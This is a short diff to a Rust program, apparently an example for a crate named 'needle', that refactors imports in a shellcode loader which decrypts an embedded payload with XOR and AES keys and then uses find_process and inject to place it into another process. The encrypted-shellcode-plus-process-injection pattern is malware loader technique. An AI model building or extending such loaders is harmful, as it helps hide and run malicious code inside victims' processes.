@@ -1,5 +1,9 @@
 use needle::{
-    cypher::{AesCypher, AesCypherExt, PayloadCypher, XorCypher, XorCypherExt},
+    cypher::{
+        aes::{AesCypher, AesCypherExt},
+        xor::{XorCypher, XorCypherExt},
+        EncryptedPayload,
+    },
     find_process, inject, Shellcode,
 };
 
@@ -32,7 +36,7 @@ const AES_KEY: [u8; 32] = [
 ];
 
 fn main() {
-    let payload = XorCypher::<AesCypher>::from(SHELL_CODE.to_vec())
+    let payload = XorCypher::<AesCypher<_>>::from(SHELL_CODE.to_vec())
         .decrypt(&XOR_KEY)
         .decrypt(&AES_KEY);
 
